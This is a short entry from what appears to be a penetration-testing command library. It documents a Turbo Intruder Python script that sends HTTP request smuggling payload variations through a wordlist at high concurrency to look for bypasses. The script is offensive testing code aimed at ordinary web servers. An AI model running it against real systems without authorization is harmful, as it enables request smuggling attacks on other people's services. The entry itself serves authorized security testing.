---
data: |-
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=50, requestsPerConnection=1000)
      for word in wordlists:
          smuggling = 'GET /icon' + word + ' HTTP/1.1\nHost: target\n\n'
          req = target.req.replace('%SMUGGLE%', smuggling)
          engine.queue(req)
tags:
  - burp
  - payload
type: command
executor: python
platforms:
  - Web
id: 1f2f0e0b-84ef-4d76-81d1-cd12f297e9cd
created_at: '2025-12-13T09:01:17.575Z'
updated_at: '2025-12-13T09:01:17.575Z'
verified: false
validated: true
submitted: true
---
# Vary Smuggling Payloads

## Command

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=50, requestsPerConnection=1000)
    for word in wordlists:
        smuggling = 'GET /icon' + word + ' HTTP/1.1\nHost: target\n\n'
        req = target.req.replace('%SMUGGLE%', smuggling)
        engine.queue(req)
```

## Description

Varies smuggling payloads in Turbo Intruder to test for bypasses and reproductions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `wordlists` | Payload variations | Yes |

## Examples

### Basic Usage

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint)
    for word in wordlists:
        engine.queue(target.req.replace('%SMUGGLE%', 'payload' + word))
```

## Expected Output

Varied requests leading to 200 OK or 500 responses.

## Related

- [[commands/observe-smuggling-response]]
- [[procedures/Exploit-HTTP-Request-Smuggling-CL-TE]]
